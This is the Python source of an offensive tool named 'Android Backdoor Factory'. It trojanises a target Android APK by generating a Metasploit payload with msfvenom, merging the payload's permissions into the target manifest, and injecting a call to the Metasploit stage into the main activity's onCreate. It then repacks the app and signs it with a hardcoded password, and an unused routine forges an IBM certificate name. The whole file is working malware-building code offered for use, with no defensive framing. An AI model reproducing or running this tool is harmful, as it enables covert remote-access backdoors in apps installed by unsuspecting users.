# Imports
import subprocess
import os
import argparse
import sys
import xml.etree.ElementTree as ET
import fileinput
import shutil
import xml.dom.minidom

def main():
    
    # Print a pretty header
    print "[#] Android Backdoor Factory"

    # parse args
    if not len(sys.argv) > 1:
        print "[#] Not enough arguments"
        print "[#] Exiting..."
        sys.exit()

    argParser = argparse.ArgumentParser()
    inputGroup = argParser.add_mutually_exclusive_group()
    inputGroup.add_argument("-t", "--target", help="Target APK file to backdoor")
    
    argParser.add_argument("-m", "--mpayload", help="Defines a metasploit payload to inject into the target APK")

    args = argParser.parse_args()

    if not os.path.exists('workspace'):
        os.mkdir('workspace')

    if args.mpayload is None:
        print "[#] Please specify a metasploit payload; These are currently the only payloads supported :("
        sys.exit()

    invokeMsfvenom(args.mpayload)
    
    print '[#] Decompiling target APK'
    decompileApk(args.target, 'target')
    
    print '[#] Decompiling payload APK'
    decompileApk('workspace/payload.apk', 'payload')
    
    backdoorMagic()
    recompileApk()
    signApk()
    print "[#] Target APK has been backdoored and is at: ./repackaged.apk"

# actual copytree wasn't working as expected; so this is a temp alterntive
def copytree(src, dst, symlinks = False, ignore = None):
  if not os.path.exists(dst):
    os.makedirs(dst)
    shutil.copystat(src, dst)
  lst = os.listdir(src)
  if ignore:
    excl = ignore(src, lst)
    lst = [x for x in lst if x not in excl]
  for item in lst:
    s = os.path.join(src, item)
    d = os.path.join(dst, item)
    if symlinks and os.path.islink(s):
      if os.path.lexists(d):
        os.remove(d)
      os.symlink(os.readlink(s), d)
      try:
        st = os.lstat(s)
        mode = stat.S_IMODE(st.st_mode)
        os.lchmod(d, mode)
      except:
        pass # lchmod not available
    elif os.path.isdir(s):
      copytree(s, d, symlinks, ignore)
    else:
      shutil.copy2(s, d)


# Do work here
def backdoorMagic():
  
    print "[#] Backdooring APK"

    ET.register_namespace('android', 'http://schemas.android.com/apk/res/android')
 
    # Read and parse manifests
    targetManifest = ET.parse('workspace/target/AndroidManifest.xml')
    payloadManifest = ET.parse('workspace/payload/AndroidManifest.xml')
 

    # step 1 - parse payload params
    targetPackageName = targetManifest.getroot().get('package')

    perms = payloadManifest.find("uses-permission")
    
    perms = payloadManifest.getroot().findall('uses-permission')
   

    # step 2 - inject params into target manifest   
    targetRoot = targetManifest.getroot()
    for perm in perms:
        targetRoot.append(perm)
    
    targetManifest.write('workspace/target/AndroidManifest.xml')


    # step 3 - locate the main activity in target
    mainActivity = locateEntryPointInActivities(targetManifest.getroot().find('application').findall('activity'))
    if mainActivity is None:
        mainActivity = locateEntryPointInActivities(targetManifest.getroot().find('application').findall('activity-alias'))

        if mainActivity is not None:
            mainActivity = mainActivity.get('{http://schemas.android.com/apk/res/android}targetActivity')
    else:
        mainActivity = mainActivity.get('{http://schemas.android.com/apk/res/android}name')
    
    if mainActivity is None:
        print "[#] Exiting: Unable to find entry point in target APK"
        sys.exit()
   
    # If activity target starts with a "." ... it is relative to package name
    if mainActivity.startswith("."):
        mainActivity = "{}{}" . format(targetPackageName, mainActivity)

    entryPointPath = 'workspace/target/smali/{}.smali' . format(mainActivity.replace('.', '/'))
   
    
    # step 4 - open and inject stuffs
    try:

        entryPointHandle = open(entryPointPath, 'r')
        entryPoint = entryPointHandle.readlines()
        entryPointHandle = open(entryPointPath, 'w')

        injectedHook = False
        for line in entryPoint:
            entryPointHandle.write(line)
            if ";->onCreate(Landroid/os/Bundle;)V" in line:
                callHook = "invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
                entryPointHandle.write(callHook)
                injectedHook = True
        entryPointHandle.close() 

        if injectedHook == False:
            print "[#] Exiting: Failed to find suitble location to inject our hook :("
            sys.exit()
    
    except IOError:

        print "[#] Exiting: Error while trying to process entrypoint smali for injeciton"
        sys.exit()

    
    # step 5 - copy payload code to target
    copytree('workspace/payload/smali/', 'workspace/target/smali/', symlinks=False, ignore=None)
    print "[#] Backdooring complete :)"


def locateEntryPointInActivities(activities):
    
    for activity in activities:
        filters = activity.findall('intent-filter')
        for filter in filters:
            action = filter.find('action')
            actionName = action.get('{http://schemas.android.com/apk/res/android}name')

            if actionName == "android.intent.action.MAIN":
                #mainActivity = activity.get('{http://schemas.android.com/apk/res/android}name')
                return activity
    return None

# Naive function to get filename w/o extension
def getFileName(path):
    return os.path.splitext(os.path.basename(path))[0]

# Generate msfvenom payloads
def invokeMsfvenom(args):
    
    print "[#] Generating metasploit payload"
    msfvenomCmd = "msfvenom --platform android -a dalvik -p {} -o workspace/payload.apk" . format(args)
    msfvenomProcess = subprocess.Popen(msfvenomCmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

    while True:
        stderr = msfvenomProcess.stderr.readline()
        if "Error:" in stderr:
            print stderr

        output = msfvenomProcess.stdout.readline()
        if output == '' and msfvenomProcess.poll() is not None:
            break

        
    rc = msfvenomProcess.poll()
    if rc is not 0:
        print "[#] Exiting: Error generating metasploit payload"
        sys.exit()


# Decompilation function
def decompileApk(targetApk, targetDir):
    
    cmd = "apktool d -f {} -o workspace/{}/" . format(targetApk, targetDir)
    apktoolProcess = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    
    while True:
        output = apktoolProcess.stdout.readline()
        if output == '' and apktoolProcess.poll() is not None:
            break
        #if output:
            #print output.strip()
    
    rc = apktoolProcess.poll()
    if rc is not 0:
        print "[#] Exiting: There was an error decompiling the provided file"
        sys.exit()


# Recompilation function
def recompileApk():
   
    print "[#] Repacking APK"
    apktoolProcess = subprocess.Popen('apktool b -f workspace/target -o repackaged.apk', shell=True, stdout=subprocess.PIPE)
    
    while True:
        output = apktoolProcess.stdout.readline()
        if output == '' and apktoolProcess.poll() is not None:
            break;
        #if output:
            #print output.strip()

    rc = apktoolProcess.poll()
    if rc is not 0:
        print "[#] Exiting: There was an error recompiling the APK"
        sys.exit()
    

# Signing function - this needs to be changed to take a cert from the user, and not use a default pass
def signApk():

    print "[#] Signing backdoored APK"
    cmd = "jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore apkreleasekey.keystore repackaged.apk abdf_key -storepass password -keypass password"
    signProcess = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    #print signProcess.stdout.read()

# Certificate generation function - this will generate a cert; needs to be worked into the script
def generateCertificate():
    command = "keytool -genkey -v -keystore apkreleasekey.keystore -alias abdf_key -keyalg RSA -keysize 2048 -validity 10000 -dname CN=mqttserver.ibm.com, OU=ID, O=IBM, L=Hursley, S=Hants, C=GB -storepass password -keypass password"


if __name__ == "__main__": main()

